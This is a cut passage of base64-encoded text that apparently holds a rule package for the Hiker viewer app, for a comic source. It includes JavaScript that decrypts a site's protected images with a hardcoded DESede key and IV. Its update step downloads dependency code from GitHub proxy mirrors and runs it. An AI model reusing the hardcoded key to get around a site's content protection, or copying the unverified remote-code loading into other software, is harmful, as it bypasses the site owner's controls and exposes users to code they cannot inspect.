GFnZSh0cnVlKVxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCJcXG4gICAgICAgICAgICAgICAgICAgIH0sIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYXRlX3RlbXA6IGNhdGVfdGVtcCxcXG4gICAgICAgICAgICAgICAgICAgICAgICBpbmRleDogaW5kZXgsXFxuICAgICAgICAgICAgICAgICAgICAgICAga2V5OiBrZXksXFxuICAgICAgICAgICAgICAgICAgICAgICAgcGFnZTogcGFnZSxcXG4gICAgICAgICAgICAgICAgICAgIH0pLFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXG4gICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwiYmxhbmtfYmxvY2tcXFwiXFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9XFxuICAgIH0pXFxufVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5Zu+54mH6Kej5a+GKlwiLFwicGF0aFwiOlwiaW1nREVTXCIsXCJydWxlXCI6XCIkLmV4cG9ydHMuaW1nRGVjcnlwdCA9IGZ1bmN0aW9uKCkge1xcbiAgICB2YXIgamF2YUltcG9ydCA9IG5ldyBKYXZhSW1wb3J0ZXIoKTtcXG4gICAgamF2YUltcG9ydC5pbXBvcnRQYWNrYWdlKFxcbiAgICAgICAgUGFja2FnZXMuY29tLmV4YW1wbGUuaGlrZXJ2aWV3LnV0aWxzLFxcbiAgICAgICAgUGFja2FnZXMuamF2YS5sYW5nLFxcbiAgICAgICAgUGFja2FnZXMuamF2YS5zZWN1cml0eSxcXG4gICAgICAgIFBhY2thZ2VzLmphdmEudXRpbCxcXG4gICAgICAgIFBhY2thZ2VzLmphdmEuaW8sXFxuICAgICAgICBQYWNrYWdlcy5qYXZhLnRleHQsXFxuICAgICAgICBQYWNrYWdlcy5qYXZheC5jcnlwdG8sXFxuICAgICAgICBQYWNrYWdlcy5qYXZheC5jcnlwdG8uc3BlY1xcbiAgICApO1xcbiAgICB3aXRoKGphdmFJbXBvcnQpIHtcXG4gICAgICAgIGxldCBieXRlcyA9IEZpbGVVdGlsLnRvQnl0ZXMoaW5wdXQpO1xcbiAgICAgICAgZnVuY3Rpb24gZGVjcnlwdERhdGEoYkFycikge1xcbiAgICAgICAgICAgIHZhciBnZW5lcmF0ZVNlY3JldCA9IFNlY3JldEtleUZhY3RvcnkuZ2V0SW5zdGFuY2UoXFxcImRlc2VkZVxcXCIpLmdlbmVyYXRlU2VjcmV0KG5ldyBERVNlZGVLZXlTcGVjKFN0cmluZygnT1c4NFU4RWVyZGI5OXJ0c1RYV1NJTERPJykuZ2V0Qnl0ZXMoKSkpO1xcbiAgICAgICAgICAgIHZhciBjaXBoZXIgPSBDaXBoZXIuZ2V0SW5zdGFuY2UoXFxcImRlc2VkZS9DQkMvUEtDUzVQYWRkaW5nXFxcIik7XFxuICAgICAgICAgICAgY2lwaGVyLmluaXQoMiwgZ2VuZXJhdGVTZWNyZXQsIG5ldyBJdlBhcmFtZXRlclNwZWMoU3RyaW5nKCdTSzhibmNWdScpLmdldEJ5dGVzKCkpKTtcXG4gICAgICAgICAgICByZXR1cm4gY2lwaGVyLmRvRmluYWwoYkFycik7XFxuICAgICAgICB9XFxuICAgICAgICAvL2RlY3J5cHREYXRh5Li66Kej5a+G5pa55rOVXFxuICAgICAgICBieXRlcyA9IGRlY3J5cHREYXRhKGJ5dGVzKTtcXG4gICAgICAgIHJldHVybiBGaWxlVXRpbC50b0lucHV0U3RyZWFtKGJ5dGVzKTtcXG4gICAgfVxcblxcbn1cIn1dLFwicGFyYW1zXCI6XCJ7XFxcInZlcnNpb25cXFwiOjMwMn1cIixcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi6ZiF5Yqo5ryrXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9wYWdlL0NvbmZpZz9ydWxlPemYheWKqOa8qyYjbm9SZWNvcmRIaXN0b3J5I1wiLFwiY29sX3R5cGVcIjpcImljb25fMl9yb3VuZFwiLFwiZmluZF9ydWxlXCI6XCJqczpcXG5hZGRMaXN0ZW5lcignb25DbG9zZScsICdjbGVhck15VmFyKFxcXCJzb3J0RmxhZ1xcXCIpO3JlZnJlc2hQYWdlKCknKVxcbnNldFBhZ2VUaXRsZSgn4pqZIOmYheWKqOa8q/CflK7orr7nva4g4pqZJylcXG5jb25zdCBRSU5HX1RJVExFID0gZ2V0TXlWYXIoJ215Q29sbGVjdGlvbicpLFxcbiAgICB1cmwgPSBnZXRNeVZhcigncmVtb3RlVXJsJylcXG5sZXQgZGF0YSA9ICQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL2RhdGFMb2FkP3J1bGU9JyArIFFJTkdfVElUTEUsIHRydWUpLFxcbiAgICBlbCA9IFt7XFxuICAgICAgICB0aXRsZTogJzxiPiDmuIXpmaTnvJPlrZjvvIznq4vljbPmm7TmlrAgPHNtYWxsPiDvvIjln7rkuo7ov5znqIvku5PlupPvvIzmsqHkuovliKvngrnvvIzlj6/mr4/mnIjngrnkuIDmrKHmm7TmlrDvvIknLFxcbiAgICAgICAgdXJsOiAkKFxcXCLmuIXpmaTnvJPlrZjvvIznq4vljbPmm7TmlrBcXFwiKS5jb25maXJtKCh1cmwpID0+IHtcXG4gICAgICAgICAgICAvL+i/nOeoi+S+nei1lue0ouW8leaWh+S7tuS7o+eQhuWcsOWdgOWIl+ihqFxcbiAgICAgICAgICAgIGxldCByZXF1aXJlbGlzdCA9IFsnaHR0cHM6Ly9yYXcuaXFpcS5pby8nLCAnaHR0cHM6Ly9naXRodWIuamV2b25zLnZpcC9odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vJywgJ2h0dHBzOi8vZ2hwcm94eS5jb20vaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLycsICdodHRwczovL2Nkbi5zdGF0aWNhbHkuY29tL2doLycsICdodHRwczovL2dpdGh1Yi5qZXZvbnMudmlwL2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8nXVxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgcmVxdWlyZWxpc3QubGVuZ3RoOyBpKyspIHtcXG4gICAgICAgICAgICAgICAgdHJ5IHsgLy/ov5znqIvkvp3otZbntKLlvJVcXG4gICAgICAgICAgICAgICAgICAgIGxldCByZXMgPSByZXF1ZXN0KHJlcXVpcmVsaXN0W2ldICsgJ1FRMTk5M0hVQU5HL1lNSi9tYWluLycsIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB3aXRoU3RhdHVzQ29kZTogdHJ1ZVxcbiAgICAgICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICAgICAgICAgIGlmIChKU09OLnBhcnNlKHJlcykuc3RhdHVzQ29kZSA9PSAyMDApIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoZmlsZUV4aXN0KHVybCkpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVsZXRlRmlsZSh1cmwpXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVpcmVEb3dubG9hZChyZXF1aXJlbGlzdFtpXSArICdRUTE5OTNIVUFORy9ZTUovbWFpbicsdXJsKVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVha1xcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVpcmVEb3dubG9hZChyZXF1aXJlbGlzdFtpXSArICdRUTE5OTNIVUFORy9ZTUovbWFpbicsdXJsKVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVha1xcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkge31cXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UodHJ1ZSlcXG4gICAgICAgICAgICBiYWNrKGZhbHNlKVxcbiAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/lt7Lmm7TmlrAnXFxuICAgICAgICB9LCB1cmwpLFxcbiAgICAgICAgaW1nOiAnaGlrZXI6Ly9pbWFnZXMvaWNvbjQnLFxcbiAgICAgICAgY29sX3R5cGU6ICdhdmF0YXInXFxuICAgIH1dLFxcbiAgICB1cGRhdGVJbnRlcnZhbCA9IHJlYWRGaWxlKCd1cGRhdGVJbnRlcnZhbCcpIHx8ICcxJyxcXG4gICAgbmV3V2luZG93ID0gcmVhZEZpbGUoJ25ld1dpbmRvdycpLFxcbiAgICB0YWJGb2xkID0gcmVhZEZpbGUoJ3RhYkZvbGQnKSxcXG4gICAgZGlzYWJsZUN1c3RvbSA9IHJlYWRGaWxlKCdkaXNhYmxlQ3VzdG9tJyksXFxuICAgIGVkaXRNb2RlID0gZGlzYWJsZUN1c3RvbSA/ICflr7zlhaXmtbfpmJQnIDogZ2V0TXlWYXIoJ2VkaXRNb2RlJywgJ+WQr+eUqC/npoHnlKgnKVxcblxcbmVsLnB1c2goe1xcbiAgICB0aXRsZTogJyAg8J+SoSDmm7TmlrDpopHnjoc6ICcgKyAodXBkYXRlSW50ZXJ2YWwgPT0gMCA/ICfmiYvliqgnIDogdXBkYXRlSW50ZXJ2YWwgKyAn5aSpJykgKyAnICAnLFxcbiAgICB1cmw6ICQodXBkYXRlSW50ZXJ2YWwsICfovpPlhaXmm7TmlrDpl7TpmpTvvIjlpKnvvInvvIzkuLow5YiZ5omL5Yqo5pu05pawXFxcXG7mnKzlnLDmlofku7bpk77mjqXml6DmlYgnKS5pbnB1dCgoKSA9PiB7XFxuICAgICAgICBpbnB1dCA9IHBhcnNlSW50KGlucHV0KVxcbiAgICAgICAgaWYgKE51bWJlci5pc05hTihpbnB1dCkpIGlucHV0ID0gMVxcbiAgICAgICAgZWxzZSBpZiAoaW5wdXQgPCAxKSBpbnB1dCA9IDBcXG4gICAgICAgIHNhdmVGaWxlKCd1cGRhdGVJbnRlcnZhbCcsIGlucHV0LnRvU3RyaW5nKCkpXFxuICAgICAgICByZWZyZXNoUGFnZSgpXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgIH0pLFxcbiAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxufSwge1xcbiAgICB0aXRsZTogJyAg8J+WpSDni6znq4vpppbpobU6ICcgKyAobmV3V2luZG93ID8gJ+aYrycgOiAn5ZCmJykgKyAnICAnLFxcbiAgICB1cmw6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKG5ld1dpbmRvdykgPT4ge1xcbiAgICAgICAgc2F2ZUZpbGUoJ25ld1dpbmRvdycsIG5ld1dpbmRvdyA/ICcnIDogJ1QnKVxcbiAgICAgICAgcmVmcmVzaFBhZ2UoKVxcbiAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICB9LCBuZXdXaW5kb3cpLFxcbiAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxufSwge1xcbiAgICB0aXRsZTogJyAg8J+SoCDliIbnsbvmipjlj6A6ICcgKyAodGFiRm9sZCA/ICfmmK8nIDogJ+WQpicpICsgJyAgJyxcXG4gICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKCh0YWJGb2xkKSA9PiB7XFxuICAgICAgICBzYXZlRmlsZSgndGFiRm9sZCcsIHRhYkZvbGQgPyAnJyA6ICdUJylcXG4gICAgICAgIHJlZnJlc2hQYWdlKClcXG4gICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgfSwgdGFiRm9sZCksXFxuICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXG59LCB7XFxuICAgIHRpdGxlOiAnICDwn5K8IOWkh+S7veaBouWkjSAgJyxcXG4gICAgdXJsOiAkKFsn5aSH5Lu9JywgJ+aBouWkjSddLCAxKS5zZWxlY3QoKFFJTkdfVElUTEUsIHVwZGF0ZUludGVydmFsLCBuZXdXaW5kb3csIHRhYkZvbGQsIGRpc2FibGVDdXN0b20pID0+IHtcXG4gICAgICAgIGxldCB1cmwgPSBnZXRNeVZhcigncmVtb3RlVXJsJylcXG4gICAgICAgIGlmICghdXJsLnN0YXJ0c1dpdGgoJ2hpa2VyOi8vJykgJiYgIXVybC5zdGFydHNXaXRoKCdmaWxlOi8vJykpXFxuICAgICAgICAgICAgdXJsID0gJ2hpa2VyOi8vZmlsZXMvbGlicy8nICsgbWQ1KHVybCkgKyAnLmpzJ1xcbiAgICAgICAgZWxzZSBpZiAodXJsLnN0YXJ0c1dpdGgoJ2hpa2VyOi8vcGFnZS8nKSkgdXJsID0gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICBpZiAoaW5wdXQgPT0gJ+Wkh+S7vScpIHJldHVybiAkKCdoaWtlcjovL2ZpbGVzL3RtcC8nICsgUUlOR19USVRMRSArICdfYmFja3VwLmpzb24nLCAn6L6T5YWl5aSH5Lu96Lev5b6EJylcXG4gICAgICAgICAgICAuaW5wdXQoKHVybCwgdXBkYXRlSW50ZXJ2YWwsIG5ld1dpbmRvdywgdGFiRm9sZCwgZGlzYWJsZUN1c3RvbSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSByZXF1ZXN0KHVybCksXFxuICAgICAgICAgICAgICAgICAgICBjdXN0b21EYXRhID0gcmVhZEZpbGUoJ2N1c3RvbURhdGEnKVxcbiAgICAgICAgICAgICAgICB3cml0ZUZpbGUoaW5wdXQsIEpTT04uc3RyaW5naWZ5KHtcXG4gICAgICAgICAgICAgICAgICAgIHVwZGF0ZUludGVydmFsOiB1cGRhdGVJbnRlcnZhbCxcXG4gICAgICAgICAgICAgICAgICAgIG5ld1dpbmRvdzogbmV3V2luZG93LFxcbiAgICAgICAgICAgICAgICAgICAgdGFiRm9sZDogdGFiRm9sZCxcXG4gICAgICAgICAgICAgICAgICAgIGRpc2FibGVDdXN0b206IGRpc2FibGVDdXN0b20sXFxuICAgICAgICAgICAgICAgICAgICBjdXN0b21EYXRhOiBjdXN0b21EYXRhLFxcbiAgICAgICAgICAgICAgICAgICAgcnVsZXM6IHJ1bGVzXFxuICAgICAgICAgICAgICAgIH0pKVxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5bey5aSH5Lu977yM5rOo5oSP6Iul5LuT5bqT5Li65a2Q6aG16Z2i5YiZ5LiN5aSH5Lu9J1xcbiAgICAgICAgICAgIH0sIHVybCwgdXBkYXRlSW50ZXJ2YWwsIG5ld1dpbmRvdywgdGFiRm9sZCwgZGlzYWJsZUN1c3RvbSlcXG4gICAgICAgIGVsc2UgcmV0dXJuICQoJ2hpa2VyOi8vZmlsZXMvdG1wLycgKyBRSU5HX1RJVExFICsgJ19iYWNrdXAuanNvbicsICfovpPlhaXlpIfku73ot6/lvoQnKS5pbnB1dCgodXJsKSA9PiB7XFxuICAgICAgICAgICAgbGV0IHsgdXBkYXRlSW50ZXJ2YWwsIG5ld1dpbmRvdywgdGFiRm9sZCwgZGlzYWJsZUN1c3RvbSwgY3VzdG9tRGF0YSwgcnVsZXMgfSA9IEpTT04ucGFyc2UocmVxdWVzdChpbnB1dCkpXFxuICAgICAgICAgICAgc2F2ZUZpbGUoJ3VwZGF0ZUludGVydmFsJywgdXBkYXRlSW50ZXJ2YWwpXFxuICAgICAgICAgICAgc2F2ZUZpbGUoJ25ld1dpbmRvdycsIG5ld1dpbmRvdylcXG4gICAgICAgICAgICBzYXZlRmlsZSgndGFiRm9sZCcsIHRhYkZvbGQpXFxuICAgICAgICAgICAgc2F2ZUZpbGUoJ2Rpc2FibGVDdXN0b20nLCBkaXNhYmxlQ3VzdG9tKVxcbiAgICAgICAgICAgIHNhdmVGaWxlKCdjdXN0b21EYXRhJywgY3VzdG9tRGF0YSlcXG4gICAgICAgICAgICBpZiAocnVsZXMpIHdyaXRlRmlsZSh1cmwsIHJ1bGVzKVxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKClcXG4gICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5bey5oGi5aSN77yM5aaC5p6c5LiN5oOz5ZCM5q2l6L+c56iL5LuT5bqT77yM5Y+v5Lul6K6+572u5pu05paw6aKR546H5Li65omL5YqoJ1xcbiAgICAgICAgfSwgdXJsKVxcbiAgICB9LCBRSU5HX1RJVExFLCB1cGRhdGVJbnRlcnZhbCwgbmV3V2luZG93LCB0YWJGb2xkLCBkaXNhYmxlQ3VzdG9tKSxcXG4gICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJ1xcbn0sIHtcXG4gICAgdGl0bGU6ICfigJzigJzigJ3igJ08Zm9udCBjb2xvcj1cXFwiIzY2NjY2NlxcXCI+PHNtYWxsPueJueWIq+m4o+iwou+8jOWwj+eoi+W6j+aPkOS+m+iAhe+8mvCfiJrvuI9cXFxcbidcXG4gICAgICAgIC8qZGF0YS5yZWR1Y2UoKHNlbGYsIHYpID0+IHYuYXV0aG9yID8gc2VsZi5jb25jYXQodi5hdXRob3Iuc3BsaXQoJyYnKSkgOiBzZWxmLCBbXSlcXG4gICAgICAgIC5maWx0ZXIoKHYsIGksIGFycikgPT4gdiAmJiBhcnIuaW5kZXhPZih2KSA9PSBpKS5qb2luKCfjgIEnKSovLFxcbiAgICB1cmw6ICdoaWtlcjovL2VtcHR5JyxcXG4gICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJ1xcbn0pXFxuZWwucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5pu05pawJuWPjemmiFxcXCIsXFxuICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS9VcCNub1JlZnJlc2gjI25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5I1xcXCIsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgICB2ZXJzaW9uOiBNWV9QQVJBTVMudmVyc2lvbiB8fCBcXFwi6I635Y+W54mI5pys5aSx6LSl77yM6Ieq6KGM5p+l55yLXFxcIlxcbiAgICB9LFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfY2VudGVyXzFcXFwiXFxufSk7XFxuZWwucHVzaCh7IGNvbF90eXBlOiAnbGluZScgfSwge1xcbiAgICB0aXRsZTogJ+KAnOKAnOKAneKAnScgKyAn8J+TnScuc21hbGwoKSArICcmbmJzcCDpmIXliqjmvKvwn5Su6Ieq5a6a5LmJICZuYnNwJy5ib2xkKCkuZm9udGNvbG9yKCcjNzU3NTc1JykgKyAoZGlzYWJsZUN1c3RvbSA/ICfinYwnIDogJ+KtlScpLnNtYWxsKCksXFxuICAgIHVybDogJChbKGRpc2FibGVDdXN0b20gPyAn5ZCv55SoJyA6ICfnpoHnlKgnKSArICflkIjpm4boh6rlrprkuYknLCAn5riF6Zmk6Ieq5a6a5LmJ5pWw5o2uJywgJ+e8lui+kUpTT04nXSwgMSkuc2VsZWN0KCgpID0+IHtcXG4gICAgICAgIHN3aXRjaCAoaW5wdXQuc2xpY2UoMCwgMikpIHtcXG4gICAgICAgICAgICBjYXNlICfmuIXpmaQnOlxcbiAgICAgICAgICAgICAgICBkZWxldGVGaWxlKCdjdXN0b21EYXRhJylcXG4gICAgICAgICAgICAgICAgYnJlYWtcXG4gICAgICAgICAgICBjYXNlICflkK/nlKgnOlxcbiAgICAgICAgICAgICAgICBzYXZlRmlsZSgnZGlzYWJsZUN1c3RvbScsICcnKVxcbiAgICAgICAgICAgICAgICBicmVha1xcbiAgICAgICAgICAgIGNhc2UgJ+emgeeUqCc6XFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdkaXNhYmxlQ3VzdG9tJywgJ1QnKVxcbiAgICAgICAgICAgICAgICBpbnB1dCArPSAnXFxcXG7lsI/nqIvluo/lkK/nlKgv56aB55So44CB6YeN5paw5o6S5bqP562J5pON5L2c5Z2H5LiN5Lya5L2T546w5Zyo6aaW6aG15bCP56iL5bqP5YiX6KGo5LitJ1xcbiAgICAgICAgICAgICAgICBicmVha1xcbiAgICAgICAgICAgIGNhc2UgJ+e8lui+kSc6XFxuICAgICAgICAgICAgICAgIGxldCB1cmwgPSBnZXRNeVZhcigncmVtb3RlVXJsJylcXG4gICAgICAgICAgICAgICAgaWYgKCF1cmwuc3RhcnRzV2l0aCgnaGlrZXI6Ly9maWxlcy8nKSAmJiAhdXJsLnN0YXJ0c1dpdGgoJ2ZpbGU6Ly8nKSlcXG4gICAgICAgICAgICAgICAgICAgIHVybCA9ICdoaWtlcjovL2ZpbGVzL2xpYnMvJyArIG1kNSh1cmwpICsgJy5qcydcXG4gICAgICAgICAgICAgICAgcmV0dXJuICAnaGlrZXI6Ly9wYWdlL2ludGVyZmFjZSNub1JlZnJlc2gjI25vSGlzdG9yeSMjbm9SZWNvcmRIaXN0b3J5Iz9ydWxlPUpTT07nvJbovpHlmagmSnNvbj0nK2Jhc2U2NEVuY29kZSh1cmwpXFxuICAgICAgICB9XFxuICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgIHJldHVybiAndG9hc3Q6Ly/lt7InICsgaW5wdXRcXG4gICAgfSksXFxuICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMScsXFxuICAgIGV4dHJhOiB7IGxpbmVWaXNpYmxlOiBmYWxzZSB9XFxufSk7LypcXG4oZGlzYWJsZUN1c3RvbSA/IFsn5a+85YWl5rW36ZiUJ10gOiBbJ+WQr+eUqC/npoHnlKgnLCAn6YeN5paw5o6S5bqPJywgJ+abtOaUueWbvuaghycsICflr7zlhaXmtbfpmJQnXSkuZm9yRWFjaCgodikgPT4ge1xcbiAgICBlbC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiB2ID09IGVkaXRNb2RlID8gJ+KAnOKAnOKAneKAnScgKyB2LmJvbGQoKS5mb250Y29sb3IoJyMxMmI2NjgnKSA6IHYsXFxuICAgICAgICB1cmw6IHYgPT0gZWRpdE1vZGUgPyAnaGlrZXI6Ly9lbXB0eScgOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKCh2KSA9PiB7XFxuICAgICAgICAgICAgcHV0TXlWYXIoJ2VkaXRNb2RlJywgdilcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICB9LCB2KSxcXG4gICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXG4gICAgfSlcXG59KTtcXG5pZiAoZWRpdE1vZGUgPT0gJ+WvvOWFpea1t+mYlCcpIGVsLnB1c2goe1xcbiAgICB0aXRsZTogJ+WFqOmDqOWvvOWFpScsXFxuICAgIHVybDogJ+a1t+mYlOinhueVjO+/pWhvbWVfcnVsZV91cmzvv6UnICsgKHVybC5zdGFydHNXaXRoKCdoaWtlcjovLycpIHx8IHVybC5zdGFydHNXaXRoKCdmaWxlOi8vJykgPyB1cmwgOiAnaGlrZXI6Ly9maWxlcy9saWJzLycgKyBtZDUodXJsKSArICcuanMnKSxcXG4gICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJyxcXG4gICAgZXh0cmE6IHsgbGluZVZpc2libGU6IGZhbHNlIH1cXG59KTtcXG4oZGlzYWJsZUN1c3RvbSA/IGRhdGEgOiBKU09OLnBhcnNlKHJlYWRGaWxlKCdjdXN0b21EYXRhJykgfHwgJ1tdJykpLmZvckVhY2goKHYsIGkpID0+IHtcXG4gICAgbGV0IGQgPSB7IHRpdGxlOiB2LnRpdGxlLCBpbWc6IGRhdGFbaV0uaWNvbiB9XFxuICAgIHN3aXRjaCAoZWRpdE1vZGUpIHtcXG4gICAgICAgIGNhc2UgJ+WQr+eUqC/npoHnlKgnOlxcbiAgICAgICAgICAgIGQudGl0bGUgPSAodi52aXNpYmxlID8gJ/Cfn6IgICcgOiAn8J+UtCAgJykgKyBkLnRpdGxlXFxuICAgICAgICAgICAgZC51cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChpKSA9PiB7XFxuICAgICAgICAgICAgICAgIGxldCBydWxlcyA9IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKVxcbiAgICAgICAgICAgICAgICBydWxlc1tpXS52aXNpYmxlID0gIXJ1bGVzW2ldLnZpc2libGVcXG4gICAgICAgICAgICAgICAgc2F2ZUZpbGUoJ2N1c3RvbURhdGEnLCBKU09OLnN0cmluZ2lmeShydWxlcykpXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICAgICAgfSwgaSlcXG4gICAgICAgICAgICBicmVha1xcbiAgICAgICAgY2FzZSAn6YeN5paw5o6S5bqPJzpcXG4gICAgICAgICAgICBsZXQgc29ydEZsYWcgPSBwYXJzZUludChnZXRNeVZhcignc29ydEZsYWcnLCAnLTEnKSlcXG4gICAgICAgICAgICBkLnRpdGxlID0gKHNvcnRGbGFnID09IGkgPyAn8J+UgyAgJyA6ICcnKSArIGQudGl0bGVcXG4gICAgICAgICAgICBpZiAoc29ydEZsYWcgPT0gLTEpXFxuICAgICAgICAgICAgICAgIGQudXJsID0gJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoaSkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoJ3NvcnRGbGFnJywgaS50b1N0cmluZygpKVxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v6YCJ5oup6KaB56e75Yqo5Yiw55qE5L2N572uJ1xcbiAgICAgICAgICAgICAgICB9LCBpKVxcbiAgICAgICAgICAgIGVsc2VcXG4gICAgICAgICAgICAgICAgZC51cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChvbGRJbmRleCwgbmV3SW5kZXgpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBydWxlcyA9IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKVxcbiAgICAgICAgICAgICAgICAgICAgcnVsZXMuc3BsaWNlKG5ld0luZGV4LCAwLCBydWxlcy5zcGxpY2Uob2xkSW5kZXgsIDEpWzBdKVxcbiAgICAgICAgICAgICAgICAgICAgc2F2ZUZpbGUoJ2N1c3RvbURhdGEnLCBKU09OLnN0cmluZ2lmeShydWxlcykpXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcignc29ydEZsYWcnLCAnLTEnKVxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICAgICAgICAgIH0sIHNvcnRGbGFnLCBpKVxcbiAgICAgICAgICAgIGJyZWFrXFxuICAgICAgICBjYXNlICfmm7TmlLnlm77moIcnOlxcbiAgICAgICAgICAgIGQudXJsID0gJCh2Lmljb24gfHwgJycsICfovpPlhaXmlrDlm77moIflnLDlnYDmiJbpopzoibLku6PnoIHvvJonKS5pbnB1dCgoaSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSBKU09OLnBhcnNlKHJlYWRGaWxlKCdjdXN0b21EYXRhJykgfHwgJ1tdJylcXG4gICAgICAgICAgICAgICAgaWYgKGlucHV0KVxcbiAgICAgICAgICAgICAgICAgICAgcnVsZXNbaV0uaWNvbiA9IGlucHV0XFxuICAgICAgICAgICAgICAgIGVsc2VcXG4gICAgICAgICAgICAgICAgICAgIGRlbGV0ZSBydWxlc1tpXS5pY29uXFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdjdXN0b21EYXRhJywgSlNPTi5zdHJpbmdpZnkocnVsZXMpKVxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgICAgIH0sIGkpXFxuICAgICAgICAgICAgYnJlYWtcXG4gICAgICAgIGNhc2UgJ+WvvOWFpea1t+mYlCc6XFxuICAgICAgICAgICAgZC51cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChpKSA9PiB7XFxuICAgICAgICAgICAgICAgIGxldCBkYXRhID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZGF0YUxvYWQ/cnVsZT0nICsgZ2V0TXlWYXIoJ215Q29sbGVjdGlvbicpLCB0cnVlKVxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3J1bGU6Ly8nICsgYmFzZTY0RW5jb2RlKEpTT04uc3RyaW5naWZ5KGRhdGFbaV0pKVxcbiAgICAgICAgICAgIH0sIGkpXFxuICAgICAgICAgICAgYnJlYWtcXG4gICAgfVxcbiAgICBlbC5wdXNoKGQpXFxufSkqL1xcbihkaXNhYmxlQ3VzdG9tID8gWyflr7zlhaXmtbfpmJQnXSA6IFsn5ZCv55SoL+emgeeUqCcsICfph43mlrDmjpLluo8nLCAn